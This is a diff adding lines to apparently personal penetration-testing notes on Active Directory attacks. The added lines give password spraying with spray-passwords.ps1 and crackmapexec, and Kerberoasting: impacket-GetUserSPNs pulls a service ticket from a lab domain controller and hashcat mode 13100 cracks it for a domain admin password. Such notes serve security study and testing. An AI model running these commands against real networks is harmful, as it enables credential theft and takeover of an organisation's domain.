@@ -48,3 +48,31 @@
             #get a output file, then sent to kali and upload upon neo4j web.
             #analysis--> shortest path to Domain admin
 
+    net accounts # show the info of account auth 
+        spray-passwords.ps1 #a tool to brute force AD account, if auth restrict
+        crackmapexec smb IP -u user_name.txt -P pss.txt -d domain_name # for non-restrict DC
+
+
+
+************************************************************
+    # a case, on a host login by a domain account, request a TGS from DC to a spn
+        sudo impacket-GetUserSPNs -request -dc-ip 192.168.1.121 goodboy.com/bob # to get TGS
+
+        # to brute force the TGS to get the passwd of the spn admin, if this account is a domain admin, did it.
+        # hashcat
+        hashcat --help | grep -i "kerberos"                                                                  
+        19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
+        19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
+        28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
+        19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
+        19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
+        28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
+         7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
+        13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
+        18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
+
+        hashcat -m 13100 hash.txt
+
+      
+
+
